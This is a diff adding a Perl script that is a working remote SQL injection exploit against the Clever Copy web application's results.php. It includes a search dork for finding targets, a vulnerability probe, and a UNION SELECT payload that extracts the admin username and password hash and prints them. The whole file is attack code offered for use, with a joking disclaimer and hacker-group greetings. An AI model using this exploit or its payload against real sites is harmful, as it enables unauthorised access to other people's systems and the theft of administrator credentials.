@@ -1,0 +1,103 @@
+#!/usr/bin/perl
+######################
+#
+#Clever Copy (results.php) Remote SQL Injection Exploit
+#
+######################
+#
+#Bug by: h0yt3r
+#
+#Dork: "powered by Clever Copy"
+#
+##
+###
+##
+#
+#This simple Exploit will give you Admin Username and md5(Password)
+#Pls don't use this to crack sites :P
+#
+#Gr33tz go to:
+#thund3r, ramon, b!zZ!t, Free-Hack, Sys-Flaw and of course the ultimate h4ck-y0u Team
+#
+
+use LWP::UserAgent;
+my $userAgent = LWP::UserAgent->new;
+
+usage();
+
+$server =   $ARGV[0];
+$dir = $ARGV[1];
+
+print"\n";
+if (!$dir) { die "Read Usage!\n"; }
+
+$filename ="results.php";
+my $url = "http://".$server.$dir.$filename;
+
+my $Attack= $userAgent->get($url);
+if ($Attack->is_success)
+{
+    print "[x] Attacking ".$url."\n";
+}
+else
+{
+    print "Couldn't connect to ".$url."!";
+    exit;
+}
+
+print "[x] Vulnerable Check:";
+
+my $check = $url."?%73%74%61%72%74%3D%30%26%73%65%61%72%63%68%74%65%72%6D%3D%43%43%4E%65%77%73%26%73%65%61%72%63%68%74%79%70%65%3D%27";
+
+my $Attack= $userAgent->get($check);
+if($Attack->content =~ m/You have an error in your SQL syntax/i)
+{
+    print " Vulnerable!\n";    
+}
+else
+{
+    print " Not Vulnerable!";
+    exit;
+}
+
+print "[x] Injecting Black Magic\n";
+
+my $Injection = "?start=0&searchterm=CCNews&searchtype=category union select 1,2,3,4,5,6,concat(char(104,48,121,116,51,114),username,0x3a,password,char(104,48,121,116,51,114)),8,9,10,11,12,13,14,15,16,17 from CC_admin/*";
+
+my $Final = $url."?seiten_id=461&sprache_id=1".$Injection;
+my $Attack= $userAgent->get($Final);    
+
+if($Attack->content =~ m/<br>h0yt3r(.*?):(.*?)h0yt3r<br>/i)
+{    
+    my $login = $1;
+    my $pass = $2;
+    print "[x] Success!\n";
+    print "[x] Admin Details:\n";
+
+    print "    Username: ".$login."\n";
+    print "    Password: ".$pass."\n";
+}
+else
+{
+    print"[x] Something wrong...";
+    exit;
+
+}
+
+sub usage()
+{
+    print q
+    {
+    #####################################################
+        Clever Copy Remote SQL Injection Exploit
+            -Written by h0yt3r-
+    Usage: Clever_Copy.pl [Server] [Path]
+    Sample:
+    perl Clever_Copy.pl www.site.com /clevercopy/
+    ######################################################
+    };
+
+}
+#eof 
+
+# milw0rm.com [2008-06-12]
